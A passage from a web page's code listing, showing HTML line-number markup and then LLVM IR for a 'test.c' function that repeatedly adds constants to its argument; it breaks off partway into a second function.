class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID = &#x27;test.c&#x27;</span><br><span class="line">source_filename = &quot;test.c&quot;</span><br><span class="line">target datalayout = &quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;</span><br><span class="line">target triple = &quot;x86_64-pc-linux-gnu&quot;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local i64 @test(i64 %0) #0 &#123;</span><br><span class="line">  %2 = add nsw i64 %0, 261593573097472</span><br><span class="line">  %3 = add nsw i64 %2, 256</span><br><span class="line">  %4 = add nsw i64 %3, 256</span><br><span class="line">  %5 = add nsw i64 %4, 256</span><br><span class="line">  %6 = add nsw i64 %5, 256</span><br><span class="line">  %7 = add nsw i64 %6, 256</span><br><span class="line">  %8 = add nsw i64 %7, 256</span><br><span class="line">  %9 = add nsw i64 %8, 256</span><br><span class="line">  %10 = add nsw i64 %9, 256</span><br><span class="line">  %11 = add nsw i64 %10, 256</span><br><span class="line">  %12 = add nsw i64 %11, 256</span><br><span class="line">  %13 = add nsw i64 %12, 256</span><br><span class="line">  %14 = add nsw i64 %13, 256</span><br><span class="line">  %15 = add nsw i64 %14, 256</span><br><span class="line">  %16 = add nsw i64 %15, 256</span><br><span class="line">  %17 = add nsw i64 %16, 256</span><br><span class="line">  %18 = add nsw i64 %17, 256</span><br><span class="line">  %19 = add nsw i64 %18, 256</span><br><span class="line">  %20 = add nsw i64 %19, 256</span><br><span class="line">  %21 = add nsw i64 %20, 256</span><br><span class="line">  %22 = add nsw i64 %21, 256</span><br><span class="line">  %23 = add nsw i64 %22, 256</span><br><span class="line">  %24 = add nsw i64 %23, 256</span><br><span class="line">  %25 = add nsw i64 %24, 256</span><br><span class="line">  %26 = add nsw i64 %25, 256</span><br><span class="line">  %27 = add nsw i64 %26, 256</span><br><span class="line">  %28 = add nsw i64 %27, 256</span><br><span class="line">  %29 = add nsw i64 %28, 256</span><br><span class="line">  %30 = add nsw i64 %29, 256</span><br><span class="line">  %31 = add nsw i64 %30, 256</span><br><span class="line">  %32 = add nsw i64 %31, 256</span><br><span class="line">  %33 = add nsw i64 %32, 256</span><br><span class="line">  %34 = add nsw i64 %33, 256</span><br><span class="line">  %35 = add nsw i64 %34, 256</span><br><span class="line">  %36 = add nsw i64 %35, 256</span><br><span class="line">  %37 = add nsw i64 %36, 256</span><br><span class="line">  %38 = add nsw i64 %37, 256</span><br><span class="line">  %39 = add nsw i64 %38, 256</span><br><span class="line">  %40 = add nsw i64 %39, 256</span><br><span class="line">  %41 = add nsw i64 %40, 256</span><br><span class="line">  %42 = add nsw i64 %41, 256</span><br><span class="line">  %43 = add nsw i64 %42, 256</span><br><span class="line">  %44 = add nsw i64 %43, 256</span><br><span class="line">  %45 = add nsw i64 %44, 256</span><br><span class="line">  %46 = add nsw i64 %45, 256</span><br><span class="line">  %47 = add nsw i64 %46, 256</span><br><span class="line">  %48 = add nsw i64 %47, 256</span><br><span class="line">  %49 = add nsw i64 %48, 256</span><br><span class="line">  %50 = add nsw i64 %49, 256</span><br><span class="line">  %51 = add nsw i64 %50, 256</span><br><span class="line">  %52 = add nsw i64 %51, 256</span><br><span class="line">  %53 = add nsw i64 %52, 256</span><br><span class="line">  %54 = add nsw i64 %53, 256</span><br><span class="line">  %55 = add nsw i64 %54, 256</span><br><span class="line">  %56 = add nsw i64 %55, 256</span><br><span class="line">  %57 = add nsw i64 %56, 256</span><br><span class="line">  %58 = add nsw i64 %57, 256</span><br><span class="line">  %59 = add nsw i64 %58, 256</span><br><span class="line">  %60 = add nsw i64 %59, 256</span><br><span class="line">  %61 = add nsw i64 %60, 256</span><br><span class="line">  %62 = add nsw i64 %61, 256</span><br><span class="line">  %63 = add nsw i64 %62, 256</span><br><span class="line">  %64 = add nsw i64 %63, 256</span><br><span class="line">  %65 = add nsw i64 %64, 256</span><br><span class="line">  %66 = add nsw i64 %65, 256</span><br><span class="line">  %67 = add nsw i64 %66, 256</span><br><span class="line">  %68 = add nsw i64 %67, 256</span><br><span class="line">  %69 = add nsw i64 %68, 256</span><br><span class="line">  %70 = add nsw i64 %69, 256</span><br><span class="line">  %71 = add nsw i64 %70, 256</span><br><span class="line">  %72 = add nsw i64 %71, 256</span><br><span class="line">  %73 = add nsw i64 %72, 256</span><br><span class="line">  %74 = add nsw i64 %73, 256</span><br><span class="line">  %75 = add nsw i64 %74, 256</span><br><span class="line">  %76 = add nsw i64 %75, 256</span><br><span class="line">  %77 = add nsw i64 %76, 256</span><br><span class="line">  %78 = add nsw i64 %77, 256</span><br><span class="line">  %79 = add nsw i64 %78, 256</span><br><span class="line">  %80 = add nsw i64 %79, 256</span><br><span class="line">  %81 = add nsw i64 %80, 256</span><br><span class="line">  %82 = add nsw i64 %81, 256</span><br><span class="line">  %83 = add nsw i64 %82, 256</span><br><span class="line">  %84 = add nsw i64 %83, 256</span><br><span class="line">  %85 = add nsw i64 %84, 256</span><br><span class="line">  %86 = add nsw i64 %85, 256</span><br><span class="line">  %87 = add nsw i64 %86, 256</span><br><span class="line">  %88 = add nsw i64 %87, 256</span><br><span class="line">  %89 = add nsw i64 %88, 256</span><br><span class="line">  %90 = add nsw i64 %89, 256</span><br><span class="line">  %91 = add nsw i64 %90, 256</span><br><span class="line">  %92 = add nsw i64 %91, 256</span><br><span class="line">  %93 = add nsw i64 %92, 256</span><br><span class="line">  %94 = add nsw i64 %93, 256</span><br><span class="line">  %95 = add nsw i64 %94, 256</span><br><span class="line">  %96 = add nsw i64 %95, 256</span><br><span class="line">  %97 = add nsw i64 %96, 256</span><br><span class="line">  %98 = add nsw i64 %97, 256</span><br><span class="line">  %99 = add nsw i64 %98, 256</span><br><span class="line">  %100 = add nsw i64 %99, 256</span><br><span class="line">  %101 = add nsw i64 %100, 256</span><br><span class="line">  %102 = add nsw i64 %101, 256</span><br><span class="line">  %103 = add nsw i64 %102, 256</span><br><span class="line">  %104 = add nsw i64 %103, 256</span><br><span class="line">  %105 = add nsw i64 %104, 256</span><br><span class="line">  %106 = add nsw i64 %105, 256</span><br><span class="line">  %107 = add nsw i64 %106, 256</span><br><span class="line">  %108 = add nsw i64 %107, 256</span><br><span class="line">  %109 = add nsw i64 %108, 256</span><br><span class="line">  %110 = add nsw i64 %109, 256</span><br><span class="line">  %111 = add nsw i64 %110, 256</span><br><span class="line">  %112 = add nsw i64 %111, 256</span><br><span class="line">  %113 = add nsw i64 %112, 256</span><br><span class="line">  %114 = add nsw i64 %113, 256</span><br><span class="line">  %115 = add nsw i64 %114, 256</span><br><span class="line">  %116 = add nsw i64 %115, 256</span><br><span class="line">  %117 = add nsw i64 %116, 256</span><br><span class="line">  %118 = add nsw i64 %117, 256</span><br><span class="line">  %119 = add nsw i64 %118, 256</span><br><span class="line">  %120 = add nsw i64 %119, 256</span><br><span class="line">  %121 = add nsw i64 %120, 256</span><br><span class="line">  %122 = add nsw i64 %121, 256</span><br><span class="line">  %123 = add nsw i64 %122, 256</span><br><span class="line">  %124 = add nsw i64 %123, 256</span><br><span class="line">  %125 = add nsw i64 %124, 256</span><br><span class="line">  %126 = add nsw i64 %125, 256</span><br><span class="line">  %127 = add nsw i64 %126, 256</span><br><span class="line">  %128 = add nsw i64 %127, 256</span><br><span class="line">  %129 = add nsw i64 %128, 256</span><br><span class="line">  %130 = add nsw i64 %129, 256</span><br><span class="line">  %131 = add nsw i64 %130, 256</span><br><span class="line">  %132 = add nsw i64 %131, 256</span><br><span class="line">  %133 = add nsw i64 %132, 256</span><br><span class="line">  %134 = add nsw i64 %133, 256</span><br><span class="line">  %135 = add nsw i64 %134, 256</span><br><span class="line">  %136 = add nsw i64 %135, 256</span><br><span class="line">  %137 = add nsw i64 %136, 256</span><br><span class="line">  %138 = add nsw i64 %137, 256</span><br><span class="line">  %139 = add nsw i64 %138, 256</span><br><span class="line">  %140 = add nsw i64 %139, 256</span><br><span class="line">  %141 = add nsw i64 %140, 256</span><br><span class="line">  %142 = add nsw i64 %141, 256</span><br><span class="line">  %143 = add nsw i64 %142, 256</span><br><span class="line">  %144 = add nsw i64 %143, 256</span><br><span class="line">  %145 = add nsw i64 %144, 256</span><br><span class="line">  %146 = add nsw i64 %145, 256</span><br><span class="line">  %147 = add nsw i64 %146, 256</span><br><span class="line">  %148 = add nsw i64 %147, 256</span><br><span class="line">  %149 = add nsw i64 %148, 256</span><br><span class="line">  %150 = add nsw i64 %149, 256</span><br><span class="line">  %151 = add nsw i64 %150, 256</span><br><span class="line">  %152 = add nsw i64 %151, 256</span><br><span class="line">  %153 = add nsw i64 %152, 256</span><br><span class="line">  %154 = add nsw i64 %153, 256</span><br><span class="line">  %155 = add nsw i64 %154, 256</span><br><span class="line">  %156 = add nsw i64 %155, 256</span><br><span class="line">  %157 = add nsw i64 %156, 256</span><br><span class="line">  %158 = add nsw i64 %157, 256</span><br><span class="line">  %159 = add nsw i64 %158, 256</span><br><span class="line">  %160 = add nsw i64 %159, 256</span><br><span class="line">  %161 = add nsw i64 %160, 256</span><br><span class="line">  %162 = add nsw i64 %161, 256</span><br><span class="line">  %163 = add nsw i64 %162, 256</span><br><span class="line">  %164 = add nsw i64 %163, 256</span><br><span class="line">  %165 = add nsw i64 %164, 256</span><br><span class="line">  %166 = add nsw i64 %165, 256</span><br><span class="line">  %167 = add nsw i64 %166, 256</span><br><span class="line">  %168 = add nsw i64 %167, 256</span><br><span class="line">  %169 = add nsw i64 %168, 256</span><br><span class="line">  %170 = add nsw i64 %169, 256</span><br><span class="line">  %171 = add nsw i64 %170, 256</span><br><span class="line">  %172 = add nsw i64 %171, 256</span><br><span class="line">  %173 = add nsw i64 %172, 256</span><br><span class="line">  %174 = add nsw i64 %173, 256</span><br><span class="line">  %175 = add nsw i64 %174, 256</span><br><span class="line">  %176 = add nsw i64 %175, 256</span><br><span class="line">  %177 = add nsw i64 %176, 256</span><br><span class="line">  %178 = add nsw i64 %177, 256</span><br><span class="line">  %179 = add nsw i64 %178, 256</span><br><span class="line">  %180 = add nsw i64 %179, 256</span><br><span class="line">  %181 = add nsw i64 %180, 256</span><br><span class="line">  %182 = add nsw i64 %181, 256</span><br><span class="line">  %183 = add nsw i64 %182, 256</span><br><span class="line">  %184 = add nsw i64 %183, 256</span><br><span class="line">  %185 = add nsw i64 %184, 256</span><br><span class="line">  %186 = add nsw i64 %185, 256</span><br><span class="line">  %187 = add nsw i64 %186, 256</span><br><span class="line">  %188 = add nsw i64 %187, 256</span><br><span class="line">  %189 = add nsw i64 %188, 256</span><br><span class="line">  %190 = add nsw i64 %189, 256</span><br><span class="line">  %191 = add nsw i64 %190, 256</span><br><span class="line">  %192 = add nsw i64 %191, 256</span><br><span class="line">  %193 = add nsw i64 %192, 256</span><br><span class="line">  %194 = add nsw i64 %193, 256</span><br><span class="line">  %195 = add nsw i64 %194, 256</span><br><span class="line">  %196 = add nsw i64 %195, 256</span><br><span class="line">  %197 = add nsw i64 %196, 256</span><br><span class="line">  %198 = add nsw i64 %197, 256</span><br><span class="line">  %199 = add nsw i64 %198, 256</span><br><span class="line">  %200 = add nsw i64 %199, 256</span><br><span class="line">  %201 = add nsw i64 %200, 256</span><br><span class="line">  %202 = add nsw i64 %201, 256</span><br><span class="line">  %203 = add nsw i64 %202, 256</span><br><span class="line">  %204 = add nsw i64 %203, 256</span><br><span class="line">  %205 = add nsw i64 %204, 256</span><br><span class="line">  %206 = add nsw i64 %205, 256</span><br><span class="line">  %207 = add nsw i64 %206, 256</span><br><span class="line">  %208 = add nsw i64 %207, 256</span><br><span class="line">  %209 = add nsw i64 %208, 256</span><br><span class="line">  %210 = add nsw i64 %209, 256</span><br><span class="line">  %211 = add nsw i64 %210, 256</span><br><span class="line">  %212 = add nsw i64 %211, 256</span><br><span class="line">  %213 = add nsw i64 %212, 256</span><br><span class="line">  %214 = add nsw i64 %213, 256</span><br><span class="line">  %215 = add nsw i64 %214, 256</span><br><span class="line">  %216 = add nsw i64 %215, 256</span><br><span class="line">  %217 = add nsw i64 %216, 256</span><br><span class="line">  %218 = add nsw i64 %217, 256</span><br><span class="line">  %219 = add nsw i64 %218, 256</span><br><span class="line">  %220 = add nsw i64 %219, 256</span><br><span class="line">  %221 = add nsw i64 %220, 256</span><br><span class="line">  %222 = add nsw i64 %221, 256</span><br><span class="line">  %223 = add nsw i64 %222, 256</span><br><span class="line">  %224 = add nsw i64 %223, 256</span><br><span class="line">  %225 = add nsw i64 %224, 256</span><br><span class="line">  %226 = add nsw i64 %225, 256</span><br><span class="line">  %227 = add nsw i64 %226, 256</span><br><span class="line">  %228 = add nsw i64 %227, 256</span><br><span class="line">  %229 = add nsw i64 %228, 256</span><br><span class="line">  %230 = add nsw i64 %229, 256</span><br><span class="line">  %231 = add nsw i64 %230, 256</span><br><span class="line">  %232 = add nsw i64 %231, 256</span><br><span class="line">  %233 = add nsw i64 %232, 256</span><br><span class="line">  %234 = add nsw i64 %233, 256</span><br><span class="line">  %235 = add nsw i64 %234, 256</span><br><span class="line">  %236 = add nsw i64 %235, 256</span><br><span class="line">  %237 = add nsw i64 %236, 256</span><br><span class="line">  %238 = add nsw i64 %237, 256</span><br><span class="line">  %239 = add nsw i64 %238, 256</span><br><span class="line">  %240 = add nsw i64 %239, 256</span><br><span class="line">  %241 = add nsw i64 %240, 256</span><br><span class="line">  %242 = add nsw i64 %241, 256</span><br><span class="line">  %243 = add nsw i64 %242, 256</span><br><span class="line">  %244 = add nsw i64 %243, 256</span><br><span class="line">  %245 = add nsw i64 %244, 256</span><br><span class="line">  %246 = add nsw i64 %245, 256</span><br><span class="line">  %247 = add nsw i64 %246, 256</span><br><span class="line">  %248 = add nsw i64 %247, 256</span><br><span class="line">  %249 = add nsw i64 %248, 256</span><br><span class="line">  %250 = add nsw i64 %249, 256</span><br><span class="line">  %251 = add nsw i64 %250, 256</span><br><span class="line">  %252 = add nsw i64 %251, 256</span><br><span class="line">  %253 = add nsw i64 %252, 256</span><br><span class="line">  %254 = add nsw i64 %253, 256</span><br><span class="line">  %255 = add nsw i64 %254, 256</span><br><span class="line">  %256 = add nsw i64 %255, 256</span><br><span class="line">  %257 = add nsw i64 %256, 256</span><br><span class="line">  %258 = add nsw i64 %257, 256</span><br><span class="line">  %259 = add nsw i64 %258, 256</span><br><span class="line">  %260 = add nsw i64 %259, 256</span><br><span class="line">  %261 = add nsw i64 %260, 256</span><br><span class="line">  %262 = add nsw i64 %261, 256</span><br><span class="line">  %263 = add nsw i64 %262, 256</span><br><span class="line">  %264 = add nsw i64 %263, 256</span><br><span class="line">  %265 = add nsw i64 %264, 256</span><br><span class="line">  %266 = add nsw i64 %265, 256</span><br><span class="line">  %267 = add nsw i64 %266, 256</span><br><span class="line">  %268 = add nsw i64 %267, 256</span><br><span class="line">  %269 = add nsw i64 %268, 256</span><br><span class="line">  %270 = add nsw i64 %269, 256</span><br><span class="line">  %271 = add nsw i64 %270, 256</span><br><span class="line">  %272 = add nsw i64 %271, 256</span><br><span class="line">  %273 = add nsw i64 %272, 256</span><br><span class="line">  %274 = add nsw i64 %273, 256</span><br><span class="line">  %275 = add nsw i64 %274, 256</span><br><span class="line">  %276 = add nsw i64 %275, 256</span><br><span class="line">  %277 = add nsw i64 %276, 256</span><br><span class="line">  %278 = add nsw i64 %277, 256</span><br><span class="line">  %279 = add nsw i64 %278, 256</span><br><span class="line">  %280 = add nsw i64 %279, 256</span><br><span class="line">  %281 = add nsw i64 %280, 256</span><br><span class="line">  %282 = add nsw i64 %281, 256</span><br><span class="line">  %283 = add nsw i64 %282, 256</span><br><span class="line">  %284 = add nsw i64 %283, 256</span><br><span class="line">  %285 = add nsw i64 %284, 256</span><br><span class="line">  %286 = add nsw i64 %285, 256</span><br><span class="line">  %287 = add nsw i64 %286, 256</span><br><span class="line">  %288 = add nsw i64 %287, 256</span><br><span class="line">  %289 = add nsw i64 %288, 256</span><br><span class="line">  %290 = add nsw i64 %289, 256</span><br><span class="line">  %291 = add nsw i64 %290, 256</span><br><span class="line">  %292 = add nsw i64 %291, 256</span><br><span class="line">  %293 = add nsw i64 %292, 256</span><br><span class="line">  %294 = add nsw i64 %293, 256</span><br><span class="line">  %295 = add nsw i64 %294, 256</span><br><span class="line">  %296 = add nsw i64 %295, 256</span><br><span class="line">  %297 = add nsw i64 %296, 256</span><br><span class="line">  %298 = add nsw i64 %297, 256</span><br><span class="line">  %299 = add nsw i64 %298, 256</span><br><span class="line">  %300 = add nsw i64 %299, 256</span><br><span class="line">  %301 = add nsw i64 %300, 256</span><br><span class="line">  %302 = add nsw i64 %301, 256</span><br><span class="line">  %303 = add nsw i64 %302, 256</span><br><span class="line">  %304 = add nsw i64 %303, 256</span><br><span class="line">  %305 = add nsw i64 %304, 256</span><br><span class="line">  %306 = add nsw i64 %305, 256</span><br><span class="line">  %307 = add nsw i64 %306, 256</span><br><span class="line">  %308 = add nsw i64 %307, 256</span><br><span class="line">  %309 = add nsw i64 %308, 256</span><br><span class="line">  %310 = add nsw i64 %309, 256</span><br><span class="line">  %311 = add nsw i64 %310, 256</span><br><span class="line">  %312 = add nsw i64 %311, 256</span><br><span class="line">  %313 = add nsw i64 %312, 256</span><br><span class="line">  %314 = add nsw i64 %313, 1</span><br><span class="line">  %315 = add nsw i64 %314, 1</span><br><span class="line">  %316 = add nsw i64 %315, 1</span><br><span class="line">  %317 = add nsw i64 %316, 256</span><br><span class="line">  ret i64 %317</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">define dso_local i64 @test2(i64 %0) #0 &#123;</span><br><span class="line">  %2 = sub nsw i64 %0, 1</span><br><span class="line">  %3 = add nsw i64 %2, 1</span><br><span class="line">  %4 = add nsw i64 %3, 1</span><br><span class="line">  %5 = add nsw i64 %4, 